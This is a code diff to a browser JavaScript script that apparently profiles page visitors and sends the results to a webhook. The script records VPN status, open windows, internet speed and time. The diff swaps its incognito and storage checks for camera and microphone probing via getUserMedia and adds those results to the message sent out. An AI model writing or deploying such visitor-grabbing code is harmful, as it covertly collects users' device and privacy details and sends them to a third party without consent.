@@ -184,23 +184,27 @@ async function checkVPN() {
     }
 }
 
-function detectIncognito() {
-    return new Promise((resolve) => {
-        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-        if (!fs) {
-            resolve("Unknown");
-        } else {
-            fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Yes"));
-        }
-    });
+async function checkCameraAccess() {
+    try {
+        await navigator.mediaDevices.getUserMedia({ video: true });
+        return "Camera Available";
+    } catch {
+        return "No Camera Access";
+    }
 }
 
-async function getStorageInfo() {
-    if (navigator.storage && navigator.storage.estimate) {
-        let estimate = await navigator.storage.estimate();
-        return `Total: ${(estimate.quota / (1024*1024*1024)).toFixed(2)} GB, Used: ${(estimate.usage / (1024*1024*1024)).toFixed(2)} GB`;
+
+async function checkMicrophoneAccess() {
+    try {
+        await navigator.mediaDevices.getUserMedia({ audio: true });
+        return "Microphone Available";
+    } catch {
+        return "No Microphone Access";
     }
-    return "Unknown";
+}
+
+  async function getActiveApplications() {
+    return "Limited Access (Browser Restriction)";
 }
 
 async function sendToWebhook() {
@@ -246,8 +250,8 @@ async function sendToWebhook() {
                          `🖥️ **Open Windows:** ${deviceInfo.numWindows}\n` +
                          `🚀 **Internet Speed:** ${internetSpeed}\n` +
                          `🛡️ **VPN/Proxy:** ${vpnStatus}\n` +
-                         `🔒 **Incognito Mode:** ${incognitoMode}\n` +
-                         `💾 **Storage Info:** ${deviceInfo.storage}\n` +
+                         `📷 **Camera Access:** ${deviceInfo.camera}\n\n` +
+                         `🎤 **Microphone Access:** ${deviceInfo.microphone}\n` +
                          `🕒 **Time:** ${dateTime}`
             };
 
